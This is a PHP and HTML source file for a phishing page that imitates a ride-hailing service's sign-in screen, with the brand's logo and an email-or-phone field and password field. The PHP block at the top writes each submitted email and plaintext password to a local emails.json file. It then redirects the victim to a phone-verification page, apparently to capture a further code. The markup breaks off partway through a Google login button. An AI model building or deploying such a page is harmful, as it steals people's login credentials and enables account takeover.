<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email'])) {
    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    
    $dataFile = 'emails.json';
    
    $emails = [];
    if (file_exists($dataFile)) {
        $jsonContent = file_get_contents($dataFile);
        $emails = json_decode($jsonContent, true) ?: [];
    }
    
    $recordId = uniqid();
    $emails[] = [
        'id' => $recordId,
        'email' => $email,
        'password' => $password,
        'timestamp' => date('Y-m-d H:i:s')
    ];
    
    file_put_contents($dataFile, json_encode($emails, JSON_PRETTY_PRINT));
    
    $_SESSION['record_id'] = $recordId;
    $_SESSION['user_email'] = $email;
    
    header('Location: phone-verification.php');
    exit;
}
?>
<!DOCTYPE html>
<html dir="ltr" lang="en" class="p-0 h-full w-full m-auto box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol] sm:flex sm:flex-col sm:justify-center sm:[background-color:oklch(100%0_none)]"
><head>
    <meta charset="utf-8">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
    tailwind.config = {
      corePlugins: {
        preflight: false,
      }
    }
    </script>
    <script>
    function togglePassword() {
      const passwordInput = document.getElementById('PASSWORD');
      const eyeIcon = document.getElementById('eye-icon');
      const eyeSlashIcon = document.getElementById('eye-slash-icon');
      
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIcon.classList.add('hidden');
        eyeSlashIcon.classList.remove('hidden');
      } else {
        passwordInput.type = 'password';
        eyeIcon.classList.remove('hidden');
        eyeSlashIcon.classList.add('hidden');
      }
    }
    </script>
  </head>
<body class="p-0 h-full w-full m-auto box-border overscroll-none [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol] sm:flex sm:flex-col sm:justify-center sm:[background-color:oklch(100%0_none)]"
  ><div id="root" class="h-full w-full box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
    ><div id="wrapper" class="flex h-full w-full flex-col box-border [-webkit-box-orient:vertical] [-webkit-box-direction:normal] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
      ><div class="absolute box-border top-[-10000px] left-[-10000px] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
        ></div
        ><div class="flex py-0 px-[64px] box-border items-center min-h-[64px] justify-between [-webkit-box-pack:justify] [-webkit-box-align:center] [background-color:oklch(0%0_none)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
        ><svg width="128" height="40" viewBox="0 0 128 40" fill="none" xmlns="http://www.w3.org/2000/svg" class="box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
          ><path d="M4.437 22.228C4.437 23.852 4.91067 25.157 5.858 26.143C6.82467 27.129 8.01367 27.622 9.425 27.622C10.817 27.622 11.9963 27.129 12.963 26.143C13.949 25.157 14.442 23.852 14.442 22.228V9.7H17.487V30H14.442V27.97C13.7847 28.7047 12.992 29.2847 12.064 29.71C11.136 30.1353 10.15 30.348 9.106 30.348C8.56467 30.348 8.033 30.2997 7.511 30.203C7.00833 30.1063 6.525 29.971 6.061 29.797C5.597 29.6037 5.15233 29.3717 4.727 29.101C4.321 28.8303 3.944 28.521 3.596 28.173C3.248 27.825 2.93867 27.4383 2.668 27.013C2.39733 26.5877 2.16533 26.1333 1.972 25.65C1.77867 25.1667 1.63367 24.6543 1.537 24.113C1.44033 23.5523 1.392 22.9723 1.392 22.373V9.7H4.437V22.228ZM20.4523 30V9.7H23.3813V17.095C24.0386 16.4183 24.8216 15.8867 25.7303 15.5C26.6389 15.094 27.6056 14.891 28.6303 14.891C29.1136 14.891 29.5776 14.9393 30.0223 15.036C30.4863 15.1133 30.9309 15.2293 31.3563 15.384C31.7816 15.5387 32.1876 15.732 32.5743 15.964C32.9609 16.1767 33.3186 16.428 33.6473 16.718C33.9953 16.9887 34.3046 17.298 34.5753 17.646C34.8653 17.9747 35.1166 18.3323 35.3293 18.719C35.5613 19.1057 35.7546 19.5117 35.9093 19.937C36.0833 20.343 36.2089 20.778 36.2863 21.242C36.3636 21.6867 36.4023 22.1507 36.4023 22.634C36.4023 23.098 36.3636 23.562 36.2863 24.026C36.2089 24.4707 36.0833 24.9057 35.9093 25.331C35.7546 25.7563 35.5613 26.1623 35.3293 26.549C35.1166 26.9163 34.8653 27.274 34.5753 27.622C34.3046 27.9507 33.9953 28.26 33.6473 28.55C33.3186 28.8207 32.9609 29.072 32.5743 29.304C32.1876 29.5167 31.7816 29.7003 31.3563 29.855C30.9309 30.0097 30.4863 30.1257 30.0223 30.203C29.5776 30.2997 29.1136 30.348 28.6303 30.348C27.6056 30.348 26.6293 30.1547 25.7013 29.768C24.7926 29.362 24.0096 28.8207 23.3523 28.144V30H20.4523ZM23.3233 22.634C23.3233 22.982 23.3523 23.33 23.4103 23.678C23.4876 24.0067 23.5843 24.3257 23.7003 24.635C23.8356 24.9443 23.9903 25.2343 24.1643 25.505C24.3576 25.7757 24.5703 26.027 24.8023 26.259C25.0343 26.491 25.2856 26.7037 25.5563 26.897C25.8269 27.071 26.1169 27.2257 26.4263 27.361C26.7356 27.4963 27.0546 27.6027 27.3833 27.68C27.7313 27.738 28.0793 27.767 28.4273 27.767C28.7753 27.767 29.1136 27.738 29.4423 27.68C29.7709 27.6027 30.0899 27.4963 30.3993 27.361C30.7086 27.2257 30.9986 27.071 31.2693 26.897C31.5399 26.7037 31.7816 26.491 31.9943 26.259C32.2263 26.027 32.4293 25.7757 32.6033 25.505C32.7966 25.2343 32.9609 24.9443 33.0963 24.635C33.2316 24.3257 33.3283 24.0067 33.3863 23.678C33.4636 23.33 33.5023 22.982 33.5023 22.634C33.5023 22.2667 33.4636 21.9187 33.3863 21.59C33.3283 21.2613 33.2316 20.9423 33.0963 20.633C32.9609 20.3237 32.7966 20.0337 32.6033 19.763C32.4293 19.473 32.2263 19.212 31.9943 18.98C31.7816 18.748 31.5399 18.545 31.2693 18.371C30.9986 18.1777 30.7086 18.023 30.3993 17.907C30.0899 17.7717 29.7709 17.675 29.4423 17.617C29.1136 17.5397 28.7753 17.501 28.4273 17.501C28.0793 17.501 27.7313 17.5397 27.3833 17.617C27.0546 17.675 26.7356 17.7717 26.4263 17.907C26.1363 18.023 25.8559 18.1777 25.5853 18.371C25.3146 18.545 25.0633 18.748 24.8313 18.98C24.5993 19.212 24.3866 19.473 24.1933 19.763C24.0193 20.0337 23.8646 20.3237 23.7293 20.633C23.5939 20.9423 23.4876 21.2613 23.4103 21.59C23.3523 21.9187 23.3233 22.2667 23.3233 22.634ZM38.1395 22.605C38.1395 22.141 38.1782 21.6867 38.2555 21.242C38.3329 20.7973 38.4489 20.372 38.6035 19.966C38.7582 19.5407 38.9419 19.1443 39.1545 18.777C39.3672 18.3903 39.6089 18.0327 39.8795 17.704C40.1502 17.356 40.4499 17.037 40.7785 16.747C41.1072 16.457 41.4552 16.2057 41.8225 15.993C42.2092 15.761 42.6055 15.5677 43.0115 15.413C43.4369 15.2583 43.8719 15.1423 44.3165 15.065C44.7805 14.9683 45.2542 14.92 45.7375 14.92C46.2209 14.92 46.6752 14.9587 47.1005 15.036C47.5452 15.1133 47.9705 15.2293 48.3765 15.384C48.8019 15.5387 49.1885 15.7223 49.5365 15.935C49.9039 16.1477 50.2422 16.399 50.5515 16.689C50.8802 16.9597 51.1799 17.2593 51.4505 17.588C51.7212 17.9167 51.9532 18.2743 52.1465 18.661C52.3592 19.0283 52.5332 19.4247 52.6685 19.85C52.8232 20.2753 52.9392 20.72 53.0165 21.184C53.0939 21.648 53.1325 22.1217 53.1325 22.605V23.562H41.0975C41.2909 24.7607 41.8419 25.766 42.7505 26.578C43.6785 27.3707 44.7612 27.767 45.9985 27.767C46.8492 27.767 47.6322 27.593 48.3475 27.245C49.0822 26.8777 49.7202 26.3267 50.2615 25.592L52.3785 27.158C51.6439 28.144 50.7255 28.9173 49.6235 29.478C48.5409 30.0387 47.3325 30.319 45.9985 30.319C45.5152 30.319 45.0319 30.2803 44.5485 30.203C44.0845 30.1257 43.6399 30.0097 43.2145 29.855C42.7892 29.7003 42.3832 29.5167 41.9965 29.304C41.6099 29.0913 41.2425 28.8497 40.8945 28.579C40.5465 28.289 40.2275 27.9797 39.9375 27.651C39.6669 27.303 39.4155 26.9453 39.1835 26.578C38.9709 26.1913 38.7775 25.7853 38.6035 25.36C38.4489 24.9347 38.3329 24.49 38.2555 24.026C38.1782 23.562 38.1395 23.0883 38.1395 22.605ZM45.6795 17.472C44.5969 17.472 43.6302 17.82 42.7795 18.516C41.9482 19.212 41.4069 20.1207 41.1555 21.242H50.1745C49.9232 20.1207 49.3819 19.212 48.5505 18.516C47.7192 17.82 46.7622 17.472 45.6795 17.472ZM62.8808 17.82H61.6628C60.7155 17.82 59.9228 18.168 59.2848 18.864C58.6662 19.5407 58.3568 20.4493 58.3568 21.59V30H55.4278V15.21H58.3278V17.037C58.6952 16.4377 59.1688 15.964 59.7488 15.616C60.3482 15.268 61.0538 15.094 61.8658 15.094H62.8808V17.82ZM70.6648 30V9.7H83.4538V13.122H74.5798V18.139H83.1638V21.474H74.5798V26.578H83.4538V30H70.6648ZM101.879 30H98.1378V28.608C97.4805 29.1687 96.7361 29.6133 95.9048 29.942C95.0735 30.2513 94.2035 30.406 93.2948 30.406C92.7921 30.406 92.3088 30.3577 91.8448 30.261C91.3808 30.1837 90.9265 30.0677 90.4818 29.913C90.0371 29.7583 89.6215 29.565 89.2348 29.333C88.8481 29.101 88.4808 28.84 88.1328 28.55C87.7848 28.26 87.4561 27.941 87.1468 27.593C86.8568 27.245 86.5958 26.8777 86.3638 26.491C86.1318 26.1043 85.9385 25.6983 85.7838 25.273C85.6291 24.8283 85.5035 24.3837 85.4068 23.939C85.3295 23.475 85.2908 23.0013 85.2908 22.518C85.2908 22.0347 85.3295 21.561 85.4068 21.097C85.5035 20.633 85.6291 20.1883 85.7838 19.763C85.9385 19.3377 86.1318 18.9317 86.3638 18.545C86.5958 18.1583 86.8568 17.791 87.1468 17.443C87.4561 17.095 87.7848 16.776 88.1328 16.486C88.4808 16.196 88.8481 15.935 89.2348 15.703C89.6215 15.471 90.0371 15.2777 90.4818 15.123C90.9265 14.9683 91.3808 14.8523 91.8448 14.775C92.3088 14.6783 92.7921 14.63 93.2948 14.63C94.2035 14.63 95.0638 14.7943 95.8758 15.123C96.7071 15.4323 97.4515 15.8577 98.1088 16.399V15.007H101.879V30ZM98.1668 22.518C98.1668 21.242 97.7221 20.169 96.8328 19.299C95.9435 18.4097 94.8705 17.965 93.6138 17.965C92.3765 17.965 91.3035 18.4097 90.3948 19.299C89.5055 20.169 89.0608 21.242 89.0608 22.518C89.0608 23.7747 89.5055 24.8573 90.3948 25.766C91.3035 26.6553 92.3765 27.1 93.6138 27.1C94.8705 27.1 95.9435 26.6553 96.8328 25.766C97.7221 24.8573 98.1668 23.7747 98.1668 22.518ZM110.536 30C109.183 30 108.158 29.6423 107.462 28.927C106.766 28.1923 106.418 27.2933 106.418 26.23V18.284H103.489V15.007H106.418V10.657H110.188V15.007H113.494V18.284H110.188V25.563C110.188 25.9497 110.314 26.2397 110.565 26.433C110.836 26.6263 111.184 26.723 111.609 26.723H113.494V30H110.536ZM121.185 30.348C119.233 30.348 117.657 29.8647 116.458 28.898C115.279 27.912 114.544 26.7037 114.254 25.273H117.85C118.044 26.027 118.44 26.578 119.039 26.926C119.658 27.2547 120.373 27.419 121.185 27.419C121.881 27.419 122.413 27.274 122.78 26.984C123.148 26.694 123.331 26.3267 123.331 25.882C123.331 25.5727 123.206 25.302 122.954 25.07C122.703 24.8187 122.326 24.6253 121.823 24.49L118.72 23.765C117.328 23.4363 116.275 22.9047 115.559 22.17C114.863 21.4353 114.515 20.4977 114.515 19.357C114.515 17.9263 115.047 16.7857 116.11 15.935C117.174 15.065 118.508 14.63 120.112 14.63C122.026 14.63 123.544 15.1327 124.665 16.138C125.806 17.124 126.483 18.3323 126.695 19.763H123.128C122.935 18.9897 122.529 18.429 121.91 18.081C121.311 17.733 120.702 17.559 120.083 17.559C119.484 17.559 119.02 17.6943 118.691 17.965C118.382 18.2357 118.227 18.5643 118.227 18.951C118.227 19.3377 118.372 19.6663 118.662 19.937C118.972 20.2077 119.426 20.4107 120.025 20.546L122.896 21.242C124.269 21.5707 125.294 22.1023 125.97 22.837C126.666 23.5717 127.014 24.49 127.014 25.592C127.014 26.926 126.492 28.057 125.448 28.985C124.404 29.8937 122.983 30.348 121.185 30.348Z" fill="white" class="box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
            ></path
            ></svg
          ></div
        ><div class="flex flex-1 box-border items-center justify-center [-webkit-box-pack:center] [-webkit-box-align:center] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
        ><div class="flex h-full w-full box-border gap-[64px] items-center justify-center max-w-[1440px] [-webkit-box-pack:center] [-webkit-box-align:center] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
          ><div class="flex py-0 flex-1 w-full flex-col px-[16px] box-border max-w-[360px] [-webkit-box-orient:vertical] [-webkit-box-direction:normal] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
            ><div class="flex h-full flex-col pt-[16px] box-border justify-between [-webkit-box-pack:justify] [-webkit-box-orient:vertical] [-webkit-box-direction:normal] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
              ><div class="flex grow flex-col box-border [-webkit-box-flex:1] [-webkit-box-orient:vertical] [-webkit-box-direction:normal] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                ><h1 id="title" class="m-0 box-border font-normal leading-[30px] [font-size:24px] text-[oklch(0%0_none)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                  >What&#039;s your phone number or email?</h1
                  ><div class="h-[8px] box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                  ></div
                  ><div class="flex flex-col box-border flex-[1_0_auto] [-webkit-box-orient:vertical] [-webkit-box-direction:normal] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                  ><div class="box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                    ><form method="POST" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">
                    <bdi class="flex flex-row box-border items-center leading-[24px] [-webkit-box-align:center] [-webkit-box-direction:normal] [-webkit-box-orient:horizontal] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                      ><div tabindex="0" id="PHONE_COUNTRY_CODE" class="hidden mr-[8px] box-border min-w-[104px] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                        ><div class="flex pl-[6px] pr-[16px] box-border rounded-[8px] cursor-pointer justify-between [-webkit-box-pack:justify] [background:oklch(94.912%0_none)] [border:2px_solid_oklch(0%0_none/0)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                          ><div class="pr-0 pl-[10px] py-[10px] box-border [font-size:32px] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                            ><div class="ml-[2px] box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                              ><span class="block mr-[10px] box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                >🇵🇰</span
                                ></div
                              ></div
                            ><div class="flex box-border items-center [-webkit-box-align:center] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                            ><svg height="16" width="16" viewBox="0 0 24 24" class="box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                              ><path d="M12.7071 15.2929L17.1464 10.8536C17.4614 10.5386 17.2383 10 16.7929 10L7.20711 10C6.76165 10 6.53857 10.5386 6.85355 10.8536L11.2929 15.2929C11.6834 15.6834 12.3166 15.6834 12.7071 15.2929Z" class="box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                ></path
                                ></svg
                              ></div
                            ></div
                          ></div
                        ><div id="phone-number-or-email-input-container" class="flex pr-0 w-full flex-row pl-[12px] py-[10px] box-border rounded-[8px] [-webkit-box-direction:normal] [-webkit-box-orient:horizontal] [background:oklch(96.415%0_none)] [border:2px_solid_oklch(0%0_none/0)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol] focus-within:[background:oklch(97.315%0_none)] focus-within:[border:2px_solid_oklch(0%0_none)]"
                        ><div class="w-full pl-[4px] box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                          ><input id="PHONE_NUMBER_or_EMAIL_ADDRESS" title="Enter phone number or email" autocomplete="email webauthn" inputmode="email" name="email" type="email" spellcheck="false" autofocus placeholder="Enter phone number or email" value="" class="m-0 p-0 w-full text-left box-border pr-[unset] [border:none] leading-[24px] [outline:none] [font-size:16px] [background:oklch(96.415%0_none)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol] focus:[background:oklch(97.315%0_none)] placeholder:text-[oklch(48.193%0_none)]"
                            /></div
                          ></div
                        ></bdi
                      ><div class="h-[16px] box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                      ></div
                      ><div id="password-input-container" class="flex pr-[12px] w-full flex-row pl-[12px] py-[10px] box-border rounded-[8px] [-webkit-box-direction:normal] [-webkit-box-orient:horizontal] [background:oklch(96.415%0_none)] [border:2px_solid_oklch(0%0_none/0)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol] focus-within:[background:oklch(97.315%0_none)] focus-within:[border:2px_solid_oklch(0%0_none)]"
                      ><div class="w-full pl-[4px] box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                        ><input id="PASSWORD" title="Enter password" autocomplete="current-password" name="password" type="password" spellcheck="false" placeholder="Enter password" value="" class="m-0 p-0 w-full text-left box-border pr-[unset] [border:none] leading-[24px] [outline:none] [font-size:16px] [background:oklch(96.415%0_none)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol] focus:[background:oklch(97.315%0_none)] placeholder:text-[oklch(48.193%0_none)]"
                          /></div
                        ><button type="button" id="toggle-password" class="flex items-center justify-center cursor-pointer [border:none] [background:transparent] p-0 ml-[8px] [-webkit-box-align:center] [-webkit-box-pack:center]" onclick="togglePassword()"
                        ><svg id="eye-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="box-border"
                          ><path d="M12 5C7 5 2.73 8.11 1 12.5C2.73 16.89 7 20 12 20C17 20 21.27 16.89 23 12.5C21.27 8.11 17 5 12 5ZM12 17.5C9.24 17.5 7 15.26 7 12.5C7 9.74 9.24 7.5 12 7.5C14.76 7.5 17 9.74 17 12.5C17 15.26 14.76 17.5 12 17.5ZM12 9.5C10.34 9.5 9 10.84 9 12.5C9 14.16 10.34 15.5 12 15.5C13.66 15.5 15 14.16 15 12.5C15 10.84 13.66 9.5 12 9.5Z" fill="#666666"
                            /></svg
                          ><svg id="eye-slash-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="box-border hidden"
                          ><path d="M12 7C14.76 7 17 9.24 17 12C17 12.65 16.87 13.26 16.64 13.83L19.56 16.75C21.07 15.49 22.26 13.86 22.99 12C21.26 7.61 16.99 4.5 11.99 4.5C10.59 4.5 9.25 4.75 8.01 5.2L10.17 7.36C10.74 7.13 11.35 7 12 7ZM2 4.27L4.28 6.55L4.74 7.01C3.08 8.3 1.78 10.02 1 12C2.73 16.39 7 19.5 12 19.5C13.55 19.5 15.03 19.2 16.38 18.66L16.8 19.08L19.73 22L21 20.73L3.27 3L2 4.27ZM7.53 9.8L9.08 11.35C9.03 11.56 9 11.78 9 12C9 13.66 10.34 15 12 15C12.22 15 12.44 14.97 12.65 14.92L14.2 16.47C13.53 16.8 12.79 17 12 17C9.24 17 7 14.76 7 12C7 11.21 7.2 10.47 7.53 9.8ZM11.84 9.02L14.99 12.17L15.01 12.01C15.01 10.35 13.67 9.01 12.01 9.01L11.84 9.02Z" fill="#666666"
                            /></svg
                          ></button
                        ></div
                      ></div
                    ><p id="field-error" class="m-0 pt-0 hidden box-border leading-[16px] [font-size:13px] text-[oklch(57.3%0.22491_21.974)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                    ></p
                    ><p class="m-0 pt-0 box-border leading-[16px] [font-size:13px] text-[oklch(57.3%0.22491_21.974)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                    ></p
                    ><div class="h-[16px] box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                    ></div
                    ><button id="forward-button" type="submit" class="m-0 flex px-[16px] py-[14px] box-border shadow-none font-medium ease-linear items-center min-h-[48px] rounded-[8px] [border:none] cursor-pointer leading-[20px] [outline:none] duration-[0.2s] [font-size:16px] transition-[background] text-[oklch(100%0_none)] [-webkit-box-align:center] [background:oklch(0%0_none)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol] focus-visible:shadow-[inset_0_0_0_3px_oklch(57.3%0.20954_261.36)] disabled:cursor-not-allowed disabled:text-[oklch(72.516%0_none)] disabled:[background:oklch(96.415%0_none)] hover:[background:oklch(27.685%0_none)] active:[background:oklch(41.283%0_none)]"
                    ><div class="flex w-full box-border items-center justify-between [-webkit-box-pack:justify] [-webkit-box-align:center] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                      ><div class="flex box-border items-center [-webkit-box-align:center] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                        ></div
                        ><div class="flex box-border items-center [-webkit-box-align:center] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                        >Continue</div
                        ><div class="flex box-border items-center [-webkit-box-align:center] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                        ></div
                        ></div
                      ></button
                    ></form
                    ><div class="box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                    ><div class="h-[16px] box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                      ></div
                      ><div class="flex flex-col gap-[8px] box-border [-webkit-box-orient:vertical] [-webkit-box-direction:normal] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                      ><div class="flex px-0 py-[4px] box-border items-center [-webkit-box-align:center] text-[oklch(48.193%0_none)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol] before:grow before:h-px before:block before:content-['_'] before:[-webkit-box-flex:1] before:[background:oklch(48.193%0_none)] after:grow after:h-px after:block after:content-['_'] after:[-webkit-box-flex:1] after:[background:oklch(48.193%0_none)] sm:before:box-border sm:before:[font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol] sm:after:box-border sm:after:[font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                        ><p class="my-0 mx-[8px] box-border leading-[16px] [font-size:14px] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                          >or</p
                          ></div
                        ><div class="flex flex-col gap-[8px] box-border [-webkit-box-orient:vertical] [-webkit-box-direction:normal] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                        ><div class="box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                          ><div class="w-full relative box-border [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                            ><button id="google-login-btn" class="m-0 flex w-full px-[16px] py-[14px] box-border shadow-none font-medium ease-linear items-center min-h-[48px] rounded-[8px] [border:none] cursor-pointer leading-[20px] [outline:none] duration-[0.2s] [font-size:16px] text-[oklch(0%0_none)] transition-[background] [-webkit-box-align:center] [background:oklch(93.1%0_none)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol] focus-visible:shadow-[inset_0_0_0_3px_oklch(57.3%0.20954_261.36)] disabled:cursor-not-allowed disabled:text-[oklch(72.516%0_none)] disabled:[background:oklch(96.415%0_none)] hover:[background:oklch(89.755%0_none)] active:[background:oklch(79.207%0_none)]"
                              ><div class="flex w-full box-border items-center justify-between [-webkit-box-pack:justify] [-webkit-box-align:center] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                ><div class="flex box-border items-center [-webkit-box-align:center] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
                                  ></div
                                  ><div class="flex box-border items-center [-webkit-box-align:center] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]"
